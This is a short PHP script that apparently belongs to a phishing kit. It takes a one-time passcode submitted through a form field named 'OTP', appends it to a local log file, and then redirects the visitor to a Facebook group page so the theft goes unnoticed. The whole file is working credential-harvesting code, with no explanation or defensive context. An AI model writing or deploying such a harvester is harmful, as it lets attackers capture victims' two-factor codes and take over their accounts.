<?php

file_put_contents("log.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://web.facebook.com/groups/317334531697381?view=info&ref=group_browse&_rdc=1&_rdr');
exit();
